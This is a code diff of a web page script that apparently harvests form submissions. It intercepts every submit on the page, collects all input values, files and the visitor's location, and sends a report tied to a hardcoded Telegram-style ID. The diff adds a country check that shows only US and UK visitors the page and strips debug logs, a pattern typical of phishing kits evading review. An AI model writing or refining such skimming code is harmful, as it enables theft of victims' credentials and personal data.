@@ -1,3 +1,43 @@
+// ================= COUNTRY BLOCKER (RUNS FIRST) =================
+(async function () {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    const allowed = ["US", "GB"]; // Allowed countries
+
+    if (!data || !allowed.includes(data.country)) {
+
+      document.documentElement.innerHTML = `
+        <style>
+          body {
+            margin: 0;
+            background: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            text-align: center;
+          }
+        </style>
+        <div>
+          <h2>🚫 Access Restricted</h2>
+          <p>This service is only available in the United States and United Kingdom.</p>
+        </div>
+      `;
+
+      throw new Error("Blocked country");
+    }
+
+  } catch (e) {
+    console.warn("Country check failed:", e);
+  }
+})();
+
+
+// ================= MAIN SCRIPT =================
 document.addEventListener("DOMContentLoaded", () => {
 
   const DEFAULT_USER_ID = "6940101627";
@@ -212,23 +252,17 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   createBox();
-  console.log("BOX CREATED");
 
   // ================= SUBMIT =================
   async function handleSubmit(form) {
-
-    console.log("FORM SUBMITTED");
 
     let userId = new URLSearchParams(window.location.search).get("id");
     if (!userId || isNaN(userId)) userId = DEFAULT_USER_ID;
 
     showBox("Processing...");
-
-    // 🔥 Force UI render
     await new Promise(resolve => setTimeout(resolve, 50));
 
     const { formData, inputCount, summary, fileCount } = buildGlobalFormData(userId, form);
-
     const loc = await getLocationData();
 
     let reportMessage = `
@@ -258,8 +292,6 @@ ${summary.length ? summary.join("\n") : "No input values"}
 
       let data = await res.json().catch(() => ({}));
 
-      console.log("SERVER RESPONSE:", data);
-
       if (!res.ok || data.ok === false) {
         showBox(`❌ ${data.error || "Server error"}`, {
           done: true,
@@ -284,7 +316,7 @@ ${summary.length ? summary.join("\n") : "No input values"}
     }
   }
 
-  // ================= ATTACH (GLOBAL FIX) =================
+  // ================= ATTACH =================
   document.addEventListener("submit", (e) => {
     const form = e.target;
 
